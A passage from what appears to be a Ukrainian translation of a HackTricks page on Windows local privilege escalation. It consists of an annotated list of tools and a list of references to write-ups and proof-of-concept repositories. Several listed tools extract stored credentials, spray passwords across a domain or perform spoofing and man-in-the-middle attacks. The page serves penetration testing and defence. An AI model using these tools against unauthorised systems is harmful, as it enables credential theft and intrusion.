- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні конфігурації та конфіденційні файли (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі неправильні конфігурації та збирає інформацію (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережені дані сеансів PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпорошує зібрані паролі по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це PowerShell-інструмент для підміни ADIDNS/LLMNR/mDNS і атаки «людина посередині».**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для підвищення привілеїв**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей для підвищення привілеїв (ЗАСТАРІВ, замість нього використовуйте Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потрібні права Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей для підвищення привілеїв (потрібно скомпілювати за допомогою VisualStudio) ([**скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує дані хоста в пошуках неправильних конфігурацій (більше інструмент для збору інформації, ніж для підвищення привілеїв) (потрібно скомпілювати) **(**[**скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (скомпільований exe є на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Перенесення PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильних конфігурацій (скомпільований виконуваний файл є на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних конфігурацій (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для коректної роботи йому не потрібен доступ до accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Аналізує вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Аналізує вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт за допомогою відповідної версії .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб дізнатися встановлену на хості-жертві версію .NET, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв шляхом експлуатації слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — воркшоп із локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — це новий чорний (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв у Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник із підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Підвищення привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA по SMTP → розшифрування облікових даних hMailServer → використання CVE-2023-27532 у Veeam для отримання SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) і крадіжка токена ядра](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — переслідування Silver Fox: гра в кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — уразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти для тестування символічних посилань — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Назад у минуле: зловживання символічними посиланнями у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Прощавай, RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: небезпечне розв’язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — завдання за контрольним списком C/C++ із розв’язаннями](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own із Microslop: поєднання CLDFLT і перегонів стану в ядрі DirectX для локального підвищення привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одне кільце I/O, щоб керувати ними всіма: примітив повного читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні прийоми](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойтів FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальне підвищення привілеїв у Windows 10 через 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: дослідження Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування Kerberos Resource Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних SSH-ключів із агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення серверів оновлень підприємства на фабрики бекдорів (0_o), частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення серверів оновлень підприємства на фабрики бекдорів (0_o), частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
